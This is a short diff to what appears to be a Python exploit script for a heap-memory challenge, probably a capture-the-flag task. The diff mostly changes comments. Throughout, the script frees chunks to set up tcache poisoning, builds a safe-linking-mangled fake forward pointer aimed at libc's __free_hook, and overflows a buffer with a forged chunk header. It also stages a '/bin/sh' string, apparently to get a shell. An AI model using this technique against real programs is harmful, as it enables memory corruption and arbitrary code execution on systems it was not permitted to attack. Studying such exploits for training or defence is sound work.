@@ -141,15 +141,13 @@ for i in range(Constants.max_feedbacks):
 for i in reversed(range(Constants.max_feedbacks-1)):
     delete_feedback(i)
 
-# Create a vacancy in the 0x110 tcache list.
+# Put the chunk we will corrupt into the tcache list for size 0x110.
 add_feedback("/bin/sh\x00")
-
-# Free the forged chunk.
 delete_feedback(1)
 
 # This request will be serviced by a consolidated combination of previous 0x110
-# chunks. Due to this chunk's larger size, we can overwrite metadata of one
-# of the 0x110 chunks that remains in use.
+# chunks. Due to this chunk's larger size, we can overwrite metadata of the
+# chunk we ensured was in the tache list in the previous step.
 fake_fd_pointer = ((heap_base + 0xbf0) >> 12) ^ libc.sym.__free_hook
 fake_chunk = p64(0x110) + p64(0x111) + p64(fake_fd_pointer)
 add_contact_details(b"A"*0x100 + fake_chunk)
